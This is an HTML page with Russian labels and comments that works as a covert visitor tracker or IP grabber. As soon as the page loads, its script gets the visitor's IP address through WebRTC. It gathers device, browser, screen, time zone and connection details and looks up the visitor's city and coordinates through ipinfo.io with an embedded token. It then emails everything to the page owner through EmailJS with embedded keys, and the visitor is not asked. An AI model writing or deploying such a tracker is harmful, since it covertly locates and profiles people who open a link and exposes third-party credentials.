<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор всех данных и отправка на почту</title>

    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
        })();

        // Получение IP-адреса через WebRTC
        function getUserIP(callback) {
            var pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => console.error(e));
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const ip = ipRegex.exec(ice.candidate.candidate)[1];
                    callback(ip);
                    pc.onicecandidate = () => {};
                }
            };
        }

        // Определение типа устройства
        function getDeviceType() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/android/.test(userAgent)) return "Android";
            if (/iphone|ipad|ipod/.test(userAgent)) return "iOS";
            if (/windows/.test(userAgent)) return "Windows";
            if (/mac/.test(userAgent)) return "Mac";
            if (/linux/.test(userAgent)) return "Linux";
            return "Неизвестное устройство";
        }

        // Получение данных о соединении
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            return {
                type: connection.effectiveType || "Неизвестно",
                downlink: connection.downlink || "Неизвестно",
                rtt: connection.rtt || "Неизвестно"
            };
        }

        // Сбор всех данных пользователя
        async function collectUserData(ip) {
            const connectionInfo = getConnectionInfo();
            const deviceType = getDeviceType();

            let userData = {
                ip: ip,
                deviceType: deviceType,
                userAgent: navigator.userAgent,
                browserLanguage: navigator.language || "Неизвестно",
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно",
                connectionType: connectionInfo.type,
                connectionSpeed: connectionInfo.downlink,
                connectionRTT: connectionInfo.rtt,
                provider: "Неизвестно",
                location: {
                    city: "Неизвестно",
                    region: "Неизвестно",
                    country: "Неизвестно",
                    latitude: "Неизвестно",
                    longitude: "Неизвестно"
                }
            };

            try {
                // Запрос данных с ipinfo.io
                const response = await fetch(`https://ipinfo.io/${ip}?token=229d6455ecea02`);
                const data = await response.json();
                
                if (data) {
                    userData.provider = data.org || "Неизвестно";
                    userData.location.city = data.city || "Неизвестно";
                    userData.location.region = data.region || "Неизвестно";
                    userData.location.country = data.country || "Неизвестно";
                    
                    if (data.loc) {
                        const [latitude, longitude] = data.loc.split(',');
                        userData.location.latitude = latitude || "Неизвестно";
                        userData.location.longitude = longitude || "Неизвестно";
                    }
                }
            } catch (error) {
                console.error("Ошибка при получении данных с ipinfo.io:", error);
            }

            return userData;
        }

        // Отправка данных через EmailJS
        function sendData(userData) {
            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                .then(function(response) {
                    console.log("Email успешно отправлен", response);
                    alert('Данные отправлены на почту!');
                }, function(error) {
                    console.error("Ошибка при отправке данных", error);
                    alert("Ошибка отправки: " + error.text);
                });
        }

        // Основная функция запуска
        function getUserData() {
            getUserIP(async function(ip) {
                const userData = await collectUserData(ip);
                console.log("Собранные данные пользователя:", userData);
                sendData(userData);
            });
        }

        window.onload = getUserData;
    </script>
</head>
<body>
    <h1>Сбор данных пользователя</h1>
</body>
</html>